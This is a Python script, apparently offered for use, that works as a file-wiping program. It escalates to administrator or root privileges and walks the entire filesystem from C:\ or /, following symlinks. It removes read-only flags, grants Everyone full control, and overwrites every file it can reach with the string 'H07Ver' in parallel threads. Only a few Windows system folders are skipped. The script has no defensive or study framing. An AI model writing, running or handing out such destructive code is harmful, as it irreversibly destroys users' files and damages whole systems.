import os
import platform
import subprocess
import ctypes
import sys
import stat
import shutil
import concurrent.futures

# Function to install required libraries (if any)
def install_libraries():
    required_libraries = ['os']  # We don't really need external libraries for this task
    for library in required_libraries:
        try:
            __import__(library)  # Check if the library is already imported
        except ImportError:
            print(f"Installing {library}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", library])

# Function to change file permissions to make it writable (works on both Windows and Linux)
def change_permissions(file_path):
    try:
        if platform.system() == 'Windows':
            # Windows: Remove read-only attribute using attrib
            subprocess.check_call(['attrib', '-R', file_path])
        else:
            # Linux: Make file writable
            os.chmod(file_path, stat.S_IWRITE)
    except Exception as e:
        print(f"Error changing permissions for {file_path}: {e}")

# Function to take ownership of the file (Windows specific)
def take_ownership(file_path):
    try:
        if platform.system() == 'Windows':
            # Windows: Take ownership of the file using icacls
            subprocess.check_call(['icacls', file_path, '/grant', 'Everyone:F'])
    except Exception as e:
        print(f"Error taking ownership of {file_path}: {e}")

# Function to overwrite a file with "H07Ver"
def overwrite_file(file_path):
    try:
        # Change file permissions to allow modification
        change_permissions(file_path)
        # Take ownership if on Windows
        take_ownership(file_path)

        # Open each file in write mode ('w') and replace its content with 'H07Ver'
        with open(file_path, 'w') as file:
            file.write('H07Ver')
        print(f"File {file_path} has been overwritten with 'H07Ver'.")
    except PermissionError:
        # If we don't have permission, log and skip it
        print(f"Permission denied: Could not overwrite {file_path}.")
    except Exception as e:
        # Catch any other error and print it
        print(f"Error processing file {file_path}: {e}")

# Function to process files in parallel
def overwrite_files_with_hover_parallel(root_dir):
    # Using ThreadPoolExecutor for parallel file processing
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = []
        for root, dirs, files in os.walk(root_dir, followlinks=True):
            for file_name in files:
                file_path = os.path.join(root, file_name)
                # Skip system and important directories on both OSes to avoid breaking the OS
                if "Windows" in file_path or "System32" in file_path or "Program Files" in file_path:
                    continue
                futures.append(executor.submit(overwrite_file, file_path))

        # Wait for all futures to complete
        for future in concurrent.futures.as_completed(futures):
            future.result()  # Raise exceptions if any

# Function to get the root directory based on OS type
def get_target_directory():
    os_type = platform.system().lower()
    if os_type == 'windows':
        return 'C:\\'  # For Windows, starting with C:\
    elif os_type == 'linux':
        return '/'  # For Linux (unix-based), starting from /
    else:
        raise Exception("Unsupported OS type")

# Function to check if the script is running with administrator privileges
def is_admin():
    if platform.system() == 'Windows':
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    else:
        return os.geteuid() == 0  # For Unix-like systems (Linux)

# Function to request administrator privileges on Windows if not already running as admin
def run_as_admin():
    if platform.system() == 'Windows' and not is_admin():
        print("This script needs to be run as Administrator.")
        # Request elevated privileges (run as admin)
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)

# Function to request root privileges on Linux if not already running as root
def run_as_root():
    if platform.system() == 'Linux' and not is_admin():
        print("This script needs to be run as root.")
        print("Use sudo to run the script with root privileges.")
        sys.exit(1)

# Main execution flow
def main():
    # Ensure the script is run as administrator (Windows) or root (Linux)
    if platform.system() == 'Windows':
        run_as_admin()
    else:
        run_as_root()

    # Install necessary libraries (if any)
    install_libraries()
    
    # Get the appropriate target directory based on the OS
    target_directory = get_target_directory()
    
    # Start overwriting files with 'H07Ver' in parallel
    overwrite_files_with_hover_parallel(target_directory)

# Run the main function
if __name__ == "__main__":
    main()
